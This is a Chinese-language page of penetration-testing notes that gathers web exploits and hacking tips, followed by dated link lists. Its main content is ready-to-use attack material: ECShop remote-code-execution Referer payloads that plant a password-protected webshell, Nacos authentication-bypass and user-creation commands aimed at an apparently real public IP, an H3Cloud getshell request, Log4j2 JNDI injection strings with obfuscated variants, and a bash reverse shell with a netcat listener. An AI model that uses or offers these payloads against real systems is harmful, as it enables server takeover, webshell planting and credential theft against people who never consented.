# Web 安全


---

## 渗透测试漏洞收集

**同源方式执行（SOME）攻击**

原理及危害

> json可以理解为，用户可以控制输入的一种JS函数。并且这种函数可以跨域访问。这就很恐怖了。比如某些存在父子网页的并且还为做过滤，很有可能你一点击后就会自动执行某些链接，如自动关注，点赞等。

攻击条件
> 存在用户可控函数点，读取用户输入执行对应javascript代码（即寻找JSONP点，通常以get方法callback名传入）
>
**ECShop <= 2.x/3.6.x/3.0.x 版本远程代码执行高危漏洞利用**

[ECShop <= 2.7.x 全系列版本远程代码执行高危漏洞利用](https://www.vulnspy.com/cn-ecshop-2.7.x-rce-exploit/)

[ECShop <= 2.x/3.6.x/3.0.x 版本远程代码执行高危漏洞利用](https://www.vulnspy.com/cn-ecshop-3.x.x-rce-exploit/)

**发送 Payload 执行 phpinfo();**

`将***.vsplate.me换成您的实验地址`

在终端中执行：

`curl http://***.vsplate.me/user.php -d "action=login&vulnspy=phpinfo();exit;" -H 'Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:"num";s:207:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:2:"id";s:9:"'"'"' union/*";s:4:"name";s:3:"ads";}45ea207d7a2b68c49582d2d22adf953a'`

EXP与一个小脚本
2.x
phpinfo():
```
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:110:"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -";s:2:"id";s:4:"' /*";}554fcae493e564ee0dc75bdf2ebf94ca
```
webshell:
```
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}
```
会在网站根目录生成1.php，密码：1337

3.x
phpinfo():
```
Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a
```
webshell:
```
Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:289:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a
```
会在网站根目录生成1.php，密码：1337

**漏洞收集**

![LARAVEL <= V8.4.2调试模式：远程执行代码](https://www.ambionics.io/blog/laravel-debug-rce)

[nacos绕过身份验证](https://github.com/alibaba/nacos/issues/4593)

漏洞复现

1. 访问用户列表界面

```bash
curl XGET 'http://47.93.46.78:9090/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'
curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'
```

此时认证被绕过，并且返回用户列表数据
```json
{
    "totalCount": 1,
    "pageNumber": 1,
    "pagesAvailable": 1,
    "pageItems": [
        {
            "username": "nacos",
            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
        }
    ]
}
```

2. 添加新用户

```bash
curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test' -H 'User-Agent: Nacos-Server'
```

此时绕过身份验证，并添加了新用户
```json
{
    "code":200,
    "message":"create user ok!",
    "data":null
}
```

3. 再次查看用户列表

```bash
curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'
```

此时绕过身份验证成功创建了一个用户。

```json
{
    "totalCount": 2,
    "pageNumber": 1,
    "pagesAvailable": 1,
    "pageItems": [
        {
            "username": "nacos",
            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
        },
        {
            "username": "test",
            "password": "$2a$10$5Z1Kbm99AbBFN7y8Dd3.V.UGmeJX8nWKG47aPXXMuupC7kLe8lKIu"
        }
    ]
}
```

[nacos后台存在注入]

`命名空间 - 操作 - 详情 - 抓包` 1.4,1.3版本 存在该SQL注入漏洞。


**H3CLOUD云管理平台getshell**

```
POST /cloud/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: XXXXXXXXXX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive
Content-Length: 1563

pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami
```

**LOG4J2**

用这个起监听
https://github.com/feihong-cs/JNDIExploit

Log4j2反弹shell

影响版本：`all log4j-core versions >=2.0-beta9 and <=2.14.1`

```
sh -i >& /dev/tcp/10.30.1.49/7777 0>&1
```

需要拿去base64编码链接如下

https://www.jackson-t.ca/runtime-exec-payloads.html

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping 172.16.200.4 -c4" -A 172.16.200.4
```

`nc -lvnp 7777`

GET传输需要URL对`{}|:`编码
```
$%7bjndi%3Aldap%3A//htlii7.dnslog.cn/Axw%7d
```

POST传输
```
POST /hello HTTP/1.1
Host: vulfocus.fofa.so:30484
Content-Type: application/x-www-form-urlencoded

payload="${jndi:rmi://32.137.126.102:1099/woqiqh}"
```
![image](./img/log4j2-2.png)

然后回弹地址用
```
${jndi:ldap://你的ip:你的端口/Deserialization/CommonsBeanutils2/TomcatEcho}
```

请求头里带
`cmd: ls`

就是直接回显的了
```
${jndi:ldap://xxx.dnslog.cn/exp}
```

log4j变形
```
${${a:-j}ndi:${a:-l}dap:${:::::::::-//}log4jtest.6a4acd96.fpxedg.cm${a/aa:-:}1288${a:-/}qwer}
```

---

## 渗透测试小技巧

**K8S获取容器shell**

```
kubtctl.exe -s ip:port get pods
kubectl.exe -s ip:port --namespace=default exec -it <CONTAINER ID> bash
```

**判断是否是站库分离**

```
（1）查询web服务器名

LENOVO-GH*****---select @@servername;

（2）查询数据库服务器名

DESKTOP-1HV****---select host_name();

对比两个查询结果，即可判断。相同则同站同库，不同就是站库分离
```
或
```
找Web端IP地址select * from information_schema.PROCESSLIST;
```

**Cobalt Strike的多种上线提醒方法**

- [Cobalt Strike的多种上线提醒方法](https://xz.aliyun.com/t/10698)

**GitHub新搜索功能**

> https://cs.github.com/

[使用 GitHub 的新代码搜索查找安全漏洞](https://www.youtube.com/watch?v=1QQPyvPCdEM&ab_channel=hakluke)

语法
```bash
# 搜索任何名字加-config.php 结尾的文件
path:*-config.php

# 搜索所有wordpress的config配置文件
path:wp-config.php

# sql注入正则表达式
/SELECT\*FROM.*\$_GET/
```

**2022-01-29**

- WEB漏洞:
[wordpress:SQL盲注--CVE-2022–21661](https://cn-sec.com/archives/736489.html)
[CWP任意文件读取-CVE-2021-45467](https://octagon.net/blog/2022/01/22/cve-2021-45467-cwp-centos-web-panel-preauth-rce/)


- 学习
[点击导致RCE](https://medium.com/manomano-tech/the-tale-of-a-click-leading-to-rce-8f68fe93545d)
[抓包修改导致接管网站子域](https://medium.com/@moSec/how-i-hacked-thousand-of-subdomains-6aa43b92282c)



**2022-02-09**

- 被动信息收集
  - https://www.webpagetest.org/
  - [shodan 信息收集的 API](https://internetdb.shodan.io/)
- 基于 `xxx../xxx` 绕过 nginx 访问
  - https://vulhub.org/#/environments/nginx/insecure-configuration/
- [一篇非常精彩的漏洞挖掘文章](https://www.cyberark.com/resources/threat-research-blog/dont-trust-this-title-abusing-terminal-emulators-with-ansi-escape-characters)

- [Macr0phag3/ja3box](https://github.com/Macr0phag3/ja3box) - ja3(s) 提取工具
    ```bash
    pip3 install scapy colorama cryptography
    git clone https://github.com/Macr0phag3/ja3box.git
    cd ja3box
    python3 ja3box.py -i eth0 --json
    ```

- 从 raw 包转到 python 脚本
    - https://medium.com/@wyv3rn/creating-easy-proof-of-concept-scripts-with-python-and-curl-5dca489c596b
    - https://curl.se/h2c/
    - https://curlconverter.com/
    - https://github.com/curlconverter/curlconverter
    - https://github.com/curl/h2c

```bash
npm install --global curlconverter
wget -O h2c https://raw.githubusercontent.com/curl/h2c/master/h2c && chmod +x h2c

sudo tee test.txt <<-'EOF'
POST /test/site/post.cgi HTTP/1.1
Host: example.com
User-Agent: moo
Shoesize: 12
Cookie: a=12; b=23
Content-Type: application/json
Content-Length: 57

{"I do not speak": "json"}
{"I do not write it": "either"}
EOF

./h2c < test.txt | curlconverter
./h2c < test.txt | curlconverter -l go
```

**2022-02-11**

- WEB漏洞:
  - [Thinkphp 5.0.X 反序列化的绕过](https://www.anquanke.com/post/id/265355#h2-8)
  - [FTP在ssrf中的应用](https://zhuanlan.zhihu.com/p/403107001)

- graphql 案例
    - https://vfpf.nl/graphql
    - [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap)
    - [doyensec/inql](https://github.com/doyensec/inql) - 用于 GraphQL 安全测试的扩展
    - https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application

- https://grep.app/ - 很好用的 github 代码搜索引擎
- https://github.com/daffainfo/all-about-apikey - 有关于各类 APIkey 密钥的利用方式

 - [Google 云端硬盘 -- SSRF](https://github.com/httpvoid/writeups/blob/main/Hacking-Google-Drive-Integrations.md)
 - [窃取 OAuth 令牌绕过 Airbnb 身份验证](https://zhuanlan.zhihu.com/p/27611465)
 - [针对OAuth2的CSRF攻击](https://www.jianshu.com/p/c7c8f51713b6)
 - https://www.anquanke.com/post/id/246658

- HOST头攻击
  - [burpsuite靶场之高级漏洞篇 - HTTP Host头攻击专题](https://www.anquanke.com/post/id/246515)

[http2-3请求工具](https://github.com/neex/http2smugl)


**2022-02-16**

- WEB:
  - 前端JS解密
  - [记一次前端安全测试](https://xz.aliyun.com/t/10801)
  - [JSFinder](https://github.com/Threezh1/JSFinder)
  - [Postgresql注入](https://www.freebuf.com/articles/web/249371.html)
  - 特斯拉未授权FOFA语句: "主页 · TeslaMate" && country="CN"








